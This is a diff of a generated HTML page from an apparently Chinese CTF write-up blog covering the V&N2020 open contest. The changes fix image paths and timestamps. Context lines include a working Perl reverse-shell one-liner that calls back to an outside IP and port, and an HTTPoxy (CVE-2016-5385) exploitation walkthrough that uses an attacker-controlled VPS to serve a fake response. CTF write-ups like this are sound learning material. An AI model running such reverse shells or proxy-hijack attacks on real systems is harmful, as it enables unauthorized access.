@@ -27,15 +27,15 @@
 <meta property="og:site_name" content="一giao我里giao">
 <meta property="og:description" content="V&amp;N2020 公开赛V&amp;N2020 公开赛">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://yoursite.com/.com//1.png">
-<meta property="og:image" content="http://yoursite.com/.com//2.png">
-<meta property="og:image" content="http://yoursite.com/.com//3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/3.png">
 <meta property="article:published_time" content="2020-03-16T02:56:54.000Z">
-<meta property="article:modified_time" content="2020-04-10T09:04:51.025Z">
+<meta property="article:modified_time" content="2020-04-11T17:14:03.176Z">
 <meta property="article:author" content="wuwuwu">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/.com//1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/1.png">
 
 <link rel="canonical" href="http://yoursite.com/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/">
 
@@ -185,7 +185,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2020-04-10 17:04:51" itemprop="dateModified" datetime="2020-04-10T17:04:51+08:00">2020-04-10</time>
+                <time title="Modified: 2020-04-12 01:14:03" itemprop="dateModified" datetime="2020-04-12T01:14:03+08:00">2020-04-12</time>
               </span>
 
           
@@ -222,7 +222,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &#39;use Socket;$i&#x3D;&quot;174.1.178.39&quot;;$p&#x3D;7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39; &amp;</span><br></pre></td></tr></table></figure>
 
 <p>然后读flag</p>
-<p><img src="/.com//1.png" alt="image-20200401215315646"></p>
+<p><img src="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/1.png" alt="image-20200401215315646"></p>
 <h2 id="V-amp-N2020-公开赛-TimeTravel"><a href="#V-amp-N2020-公开赛-TimeTravel" class="headerlink" title="[V&amp;N2020 公开赛]TimeTravel"></a>[V&amp;N2020 公开赛]TimeTravel</h2><p>考察：HTTPoxy漏洞（CVE-2016-5385）</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -232,7 +232,7 @@
 <p>CGI有个特性就是：会将header中的proxy参数设置冲环境变量HTTP_PROXY</p>
 <p>在PHP 5.6.23版本中存在漏洞CVE-2016-5385</p>
 <p>参考：<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">CVE-2016-5385</a></p>
-<p><img src="/.com//2.png" alt=" "></p>
+<p><img src="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/2.png" alt=" "></p>
 <p>所以解题思路如下：</p>
 <p>现在vps中的写入<code>b.txt</code>内容如下：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Server: nginx/<span class="number">1.14</span><span class="number">.2</span></span><br><span class="line">Date: Fri, <span class="number">06</span> Mar <span class="number">2020</span> <span class="number">18</span>:<span class="number">27</span>:<span class="number">31</span> GMT</span><br><span class="line">Content-Type: text/html; charset=UTF<span class="number">-8</span></span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: <span class="number">16</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"success"</span>:<span class="keyword">true</span>&#125;</span><br></pre></td></tr></table></figure>
@@ -251,7 +251,7 @@
 <p>当发送该请求的时候，proxy的请求会作为HTTP_PROXY</p>
 <p>这时候会访问vps的8888端口，这时候就会发送出b.txt的内容，使得<code>$data[&#39;success&#39;] === true</code></p>
 <p>获得flag</p>
-<p><img src="/.com//3.png" alt="image-20200401234144438"></p>
+<p><img src="/2020/03/16/V-N2020%E5%85%AC%E5%BC%80%E8%B5%9B/3.png" alt="image-20200401234144438"></p>
 
     </div>
 
@@ -355,7 +355,7 @@
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
